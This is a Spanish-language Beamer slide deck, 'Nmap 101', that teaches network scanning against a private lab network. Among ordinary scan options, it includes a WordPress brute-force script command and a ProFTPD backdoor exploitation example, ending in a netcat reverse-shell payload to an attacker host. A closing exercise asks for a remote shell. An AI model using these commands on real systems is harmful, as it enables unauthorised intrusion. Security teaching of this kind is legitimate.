\documentclass[aspectratio=169]{beamer}
\usepackage{listings}
\usepackage{multirow}


\usetheme{Singapore}
\usecolortheme{orchid}

\definecolor{slightblue}{RGB}{0, 104, 173}

\usecolortheme[named=slightblue]{structure}

\definecolor{mygray}{RGB}{200, 200, 200}
\definecolor{mygreen}{RGB}{0, 186, 11}
\definecolor{myyellow}{RGB}{179, 176, 16}
\definecolor{myblack}{RGB}{30, 33, 35}

\lstset{ 
    backgroundcolor=\color{myblack},
    language=bash,
    basicstyle=\ttfamily\color{mygray},
    morekeywords={*,sudo, nmap, user@kali},
    keywordstyle=\color{mygreen},
    stringstyle=\color{myyellow},
    showstringspaces=false,
    breaklines=true,
}

\title{Nmap 101}
\author{Santiago Gimenez Ocano}
\date{}

\begin{document}

\begin{frame}
    \begin{block}{}
        \titlepage
    \end{block}
\end{frame}

\begin{frame}
    \frametitle{Aviso}
    \begin{block}{}
        \begin{center}
            Este documento tiene \'unicamente prop\'osito educativo. Antes de analizar una red, se debe tener el permiso correspondiente.
        \end{center}
    \end{block}   
\end{frame}

\begin{frame}
    \frametitle{Agenda}
    \tableofcontents
\end{frame}

\section{Introducci\'on y Uso B\'asico}

\subsection{Introducci\'on}
\begin{frame}

    \frametitle{Introducci\'on}

    \begin{columns}
        \begin{column}{0.5\textwidth}

            Nmap (``Network Mapper'') es una herramienta:

            \begin{itemize}
                \item gratuita,
                \item c\'odigo abierto,
                \item permite encontrar dispositivos en redes,
                \item permite hacer auditor\'ias de seguridad.
            \end{itemize}

        \end{column}

        \pause

        \begin{column}{0.5\textwidth}
    
            Nmap puede encontrar:

            \begin{itemize}
                \item los dispositivos en una red,
                \item los servicios,
                \item el sistema operativo,
                \item los firewalls y filtros usados.
            \end{itemize}

        \end{column}
    \end{columns}

\end{frame}

\begin{frame}

    \frametitle{Introducci\'on}

    \begin{block}{}
        \begin{center}
            Nmap es un esc\'aner de red.
        \end{center}
    \end{block}

    \pause

    \begin{block}{}
        \begin{center}
            Nmap nos permite saber qu\'e hay en una red en vez de qu\'e deberia haber.
        \end{center}
    \end{block}

\end{frame}

\subsection{Uso B\'asico}
\begin{frame}[fragile]

    \frametitle{Uso B\'asico}

    \framesubtitle{Metodolog\'ia}

    \begin{block}{}
        \begin{center}
            Desde una visi\'on global de la red, y llendo hacia una visi\'on particular.
        \end{center}
    \end{block}

    \pause

    \begin{center}
        \begin{tabular}{rc}
            \Huge$\uparrow$ & 
            \begin{tabular}{cc}
                \textbf{Fases de nmap} & \textbf{Modelo TCP/IP}\\ \hline
                Escaneo con Script & Aplicaci\'on \\ \hline
                Escaneo de Puertos & Transporte \\ \hline
                \multirow{2}{*}{B\'usqueda de sistemas (Descubrimiento)} & Internet\\ \cline{2-2}
                & Enlace \\ \hline
            \end{tabular}
        \end{tabular}
    \end{center}

\end{frame}

\begin{frame}[fragile]
    \frametitle{Uso B\'asico}

    \framesubtitle{Sintaxis de comando}

    \begin{lstlisting}
 user@kali $ sudo nmap [Scan Type] [Options] {targets}
    \end{lstlisting}

    \texttt{Targets}:

    \begin{itemize}
        \item URLs,
        \item lista de direcciones IP,
        \item direcciones de red en CIDR,
        \item mezcla de los anteriores,
        \item desde un archivo.
    \end{itemize}

\end{frame}

\begin{frame}[fragile]

    \frametitle{Uso B\'asico}

    \framesubtitle{Ejemplos}

    \begin{lstlisting}
 user@kali $ sudo nmap 192.168.56.16
    \end{lstlisting}

    Descubrir, escanear los 1000 puertos TCP m\'as comunes.

    \pause

    \begin{lstlisting}
 user@kali $ sudo nmap 192.168.56.0/24
    \end{lstlisting}

    Descubrir, escanear los 1000 puertos TCP m\'as comunes, todos los dispositivos en la red.

    \pause

    \begin{lstlisting}
 user@kali $ sudo nmap 192.168.56.16-19
    \end{lstlisting}

    Igual al enterior, pero con una lista de direcciones IP.

    \pause

    \begin{lstlisting}
 user@kali $ sudo nmap -iL targets.txt
    \end{lstlisting}

    Descubrir, escanear, pero con archivo con direcciones o redes IP.

\end{frame}

\section{Opciones}

\subsection{Modificando el escaneo}

\begin{frame}
    \frametitle{Modificando el escaneo}

    M\'ultiple opciones, las relacionadas a los puertos permiten:

    \begin{itemize}
        \item cambiar el n\'umero de puertos a analizar,
        \item especificar los puertos a analizar,
        \item mostrar solo los puertos abiertos,
        \item escanear puertos UDP.
    \end{itemize}

\end{frame}

\begin{frame}[fragile]
    \frametitle{Modificando el escaneo}

    \framesubtitle{Ejemplos (1)}

    \begin{lstlisting}
 user@kali $ sudo nmap --top-ports 10 192.168.56.16
    \end{lstlisting}

    Escanear solo los 10 puertos m\'as comunes.

    \pause

    \begin{lstlisting}
 user@kali $ sudo nmap -F 192.168.56.16
    \end{lstlisting}

    Escanear solo los 100 puertos m\'as comunes. ``F'' significa ``Fast''.

    \pause

    \begin{lstlisting}
 user@kali $ sudo nmap -p- 192.168.56.16
    \end{lstlisting}

    Escanear todos los puertos.

\end{frame}

\begin{frame}[fragile]

    \frametitle{Modificando el escaneo}

    \framesubtitle{Ejemplos (2)}

    \begin{lstlisting}
 user@kali $ sudo nmap -p22,80,443 192.168.56.17
    \end{lstlisting}

    Escanear solo los puertos especificados.

    \pause

    \begin{lstlisting}
 user@kali $ sudo nmap --open -p22,80,443 192.168.56.17
    \end{lstlisting}

    Igual al anterior pero solo muestra los puertos abiertos.

    \pause

    \begin{lstlisting}
 user@kali $ sudo nmap -sU --top-ports 10 192.168.56.16
    \end{lstlisting}

    Este comando va a escanear solo los 10 puertos UDP m\'as comunes.

\end{frame}

\subsection{Obteniendo m\'as informaci\'on}
\begin{frame}
    \frametitle{Obteniendo m\'as informaci\'on}

    Adem\'as podemos obtener:

    \begin{itemize}
        \item reconocimiento del sistema operativo (OS fingerprinting),
        \item nombre y versi\'on de servicios,
        \item informaci\'on provista por scripts b\'asicos.
    \end{itemize}

\end{frame}

\begin{frame}[fragile]
    \frametitle{Obteniendo m\'as informaci\'on}

    \framesubtitle{Ejemplos}

    \begin{lstlisting}
 user@kali $ sudo nmap -O 192.168.56.16
    \end{lstlisting}

    Reconocimiento del sistema operativo.

    \pause

    \begin{lstlisting}
 user@kali $ sudo nmap -sV 192.168.56.16
    \end{lstlisting}

    Nombre y versi\'on de servicios.

    \pause

    \begin{lstlisting}
 user@kali $ sudo nmap -sC 192.168.56.16
    \end{lstlisting}

    Informaci\'on adicional usando scripts b\'asicos.

    \pause

    \begin{lstlisting}
 user@kali $ sudo nmap -A 192.168.56.16
    \end{lstlisting}

    Todos los anteriories y traceroute.

\end{frame}

\section{M\'as Opciones}

\subsection{Ajustando la velocidad}

\begin{frame}[fragile]
    \frametitle{Ajustando la velocidad}

    La velocidad de escaneo es controlada de forma autom\'atica.

  \pause

    \vspace{1em}
  
    Opciones de velocidad:

    \begin{itemize}
        \item \texttt{-T0} (paranoid), 
        \item \texttt{-T1} (sneaky), 
        \item \texttt{-T2} (polite),
        \item \texttt{-T3} (normal),
        \item \texttt{-T4} (aggressive),
        \item \texttt{-T5} (insane)
    \end{itemize}

    \pause

    \begin{lstlisting}
 user@kali $ sudo nmap -T5 192.168.56.16
    \end{lstlisting}

    \pause

    \begin{lstlisting}
 user@kali $ sudo nmap -T0 192.168.56.16
    \end{lstlisting}

\end{frame}

\subsection{Guardando los resultados}
\begin{frame}[fragile]
    \frametitle{Guardando los resultados}

    Opciones de formato:

    \begin{lstlisting}
 user@kali $ sudo nmap [frmt {<file_name>}] {targets}
    \end{lstlisting}

    \pause

    Donde \texttt{frmt}:

    \begin{itemize}
        \item \texttt{-oN} es para archivos regulares,
        \item \texttt{-oX} es para archivos XML,
        \item \texttt{-oG} es para archivos para ser usados con expresiones regulares.
    \end{itemize}

    \pause

    \begin{lstlisting}
 user@kali $ sudo nmap -oG results.txt 192.168.56.16
    \end{lstlisting}
    
\end{frame}

\section{Scripts}

\begin{frame}[fragile]
    \frametitle{Scripts}

    Los scripts:

    \begin{itemize}
        \item aumentan el comportamiento de nmap,
        \item permiten:
        \begin{itemize}
            \item obtener informaci\'on adicional,
            \item encontrar vulnerabilidades por categoria de vulnerabilidades,
            \item encontrar vulnerabilidades espec\'ificas.
        \end{itemize}
    \end{itemize}

    \pause

    \begin{block}{}
        \begin{center}
            Algunos scripts son considerados intrusivos.
        \end{center}
    \end{block}

\end{frame}

\begin{frame}[fragile]
    \frametitle{Scripts}
    \framesubtitle{Sintaxis}

    \begin{lstlisting}
 user@kali $ sudo nmap [--script=<script> [--script-args=<script_arguments>]] {targets}
    \end{lstlisting}

\end{frame}


\begin{frame}[fragile]
    \frametitle{Scripts}
    
    \framesubtitle{Ejemplos (1)}

    \begin{lstlisting}
 user@kali $ sudo nmap --script=vuln 192.168.56.16
    \end{lstlisting}

    Ejecutar todos los scripts dentro de la categoria ``vulnerability''.

    \pause

    \begin{lstlisting}
 user@kali $ sudo nmap --script="http-robots*" 192.168.56.16
    \end{lstlisting}

    Mostrar el contenido del archivo \texttt{robots.txt}.

    \pause

    \begin{lstlisting}
 user@kali $ sudo nmap -sV --script="http-wordpress-brute*" --script-args="passdb=./dict.txt" 192.168.56.16
    \end{lstlisting}
       
    Ataque de fuerza bruta en un servicio de Wordpress.

\end{frame}

\begin{frame}[fragile]
    \frametitle{Scripts}
    
    \framesubtitle{Ejemplos (2)}

    \begin{lstlisting}
 user@kali $ sudo nmap -sV --script="ftp-proftpd-backd*" 192.168.56.19
    \end{lstlisting}

    Verificar si el target es vulnerable a una vulnerabilidad espec\'ifica.

    \pause       

    \begin{lstlisting}
 user@kali $ sudo nmap -sV --script="ftp-proftpd-back*" --script-args="cmd=ls" 192.168.56.19
    \end{lstlisting}

    Listar el contenido de un directorio.

\end{frame}

\begin{frame}[fragile]
    \frametitle{Scripts}
    
    \framesubtitle{Ejemplos (3)}

    \begin{lstlisting}
 user@kali $ sudo nmap -sV --script="ftp-proftpd-back*" --script-args="cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>\&1|nc 192.168.56.1 4444 >/tmp/f" 192.168.56.19
    \end{lstlisting}

    Genera una conexi\'on remota hacia el sistema del atacante. 
    
\end{frame}

\section{Extras}

\begin{frame}[fragile]
    \frametitle{Recapitulando}
    
    En esta charla vimos:

    \begin{itemize}
        \item Encontar sistemas en una red,
        \item Encontrar los puertos abiertos en los sistemas,
        \item Obtener el nombre y versi\'on del servicio,
        \item Ejecutar scripts para obtener m\'as info,
        \item Ejecutar scripts para encontrar vulnerabilidades,
        \item Ejecutar scripts para explotar vulnerabilidades.
    \end{itemize}

    \pause

    \begin{block}{}
        \begin{center}
            Solo vimos la punta del iceberg. Los invito a investigar m\'as sobre nmap.
        \end{center}
    \end{block}
    
\end{frame}

\begin{frame}
    \begin{block}{}
        \huge
        \begin{center}
            Preguntas y ?`Respuestas?
        \end{center}
    \end{block}

    \begin{block}{Referencias}
        \begin{itemize}
            \item Sitio: \texttt{https://nmap.org}
            \item Manual: \texttt{man nmap}
            \item Scripts: \texttt{https://nmap.org/nsedoc/index.html}
            \item Libro 1: \texttt{https://nmap.org/book}
            \item Libro 2: Marsh, Nicholas. \textit{Nmap 6 Cookbook: The Fat-Free Guide to Network Scanning}. 2015
        \end{itemize}
    \end{block}

\end{frame}

\begin{frame}
    \frametitle{Ejercicio}

    \begin{enumerate}
    \item Identificar el puerto escondido en 192.168.56.19.
    \item Identificar el nombre y versi\'on del servicio en el puerto escondido.
    \item Identificar si el servicio es vulnerable a un exploit conocido.
    \item Obtener una conexi\'on remota cambiando los argumentos del script. 
    \end{enumerate}

\end{frame}

\end{document}